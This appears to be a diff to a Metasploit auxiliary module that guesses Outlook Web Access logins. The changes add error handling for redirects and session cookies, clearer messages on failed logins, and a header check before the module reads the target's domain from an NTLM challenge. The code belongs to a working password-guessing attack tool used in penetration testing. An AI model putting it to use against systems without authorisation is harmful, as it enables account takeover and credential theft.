@@ -204,24 +204,31 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       #No password change required moving on.
-      reason = res.headers['location'].split('reason=')[1]
+      unless location = res.headers['location']
+        print_error("#{msg} No HTTP redirect.  This is not OWA 2013, aborting.")
+        return :abort
+      end
+      reason = location.split('reason=')[1]
       if reason == nil
         headers['Cookie'] = 'PBack=0;' << res.get_cookies
       else
       #Login didn't work. no point on going on.
-        vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
+        vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})")
         return :Skip_pass
       end
     else
        # The authentication info is in the cookies on this response
       cookies = res.get_cookies
-      sessionid_value = cookies.split('sessionid=')[1]
-      sessionid_value = sessionid_value.to_s.split('; ')[0]
-      sessionid_header = "sessionid=#{sessionid_value}"
-      cadata_value = cookies.split('cadata=')[1]
-      cadata_value = cadata_value.to_s.split('; ')[0]
-      cadata_header = "cadata=#{cadata_value}"
-      headers['Cookie'] = 'PBack=0; ' << sessionid_header << '; ' << cadata_header
+      cookie_header = 'PBack=0'
+      %w(sessionid cadata).each do |necessary_cookie|
+        if cookies =~ /#{necessary_cookie}=([^;]+)/
+          cookie_header << "; #{Regexp.last_match(1)}"
+        else
+          print_error("#{msg} Missing #{necessary_cookie} cookie.  This is not OWA 2010, aborting")
+          return :abort
+        end
+      end
+      headers['Cookie'] = cookie_header
     end
 
     begin
@@ -240,8 +247,8 @@ class Metasploit3 < Msf::Auxiliary
       return :abort
     end
 
-    if res.code == 302
-      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
+    if res.redirect?
+      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
       return :skip_pass
     end
 
@@ -260,7 +267,7 @@ class Metasploit3 < Msf::Auxiliary
       report_auth_info(report_hash)
       return :next_user
     else
-      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
+      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}' (response body did not match)")
       return :skip_pass
     end
   end
@@ -295,7 +302,7 @@ class Metasploit3 < Msf::Auxiliary
         next
       end
 
-      if res and res.code == 401 and res['WWW-Authenticate'].match(/^NTLM/i)
+      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
         hash = res['WWW-Authenticate'].split('NTLM ')[1]
         domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
         print_good("Found target domain: " + domain)
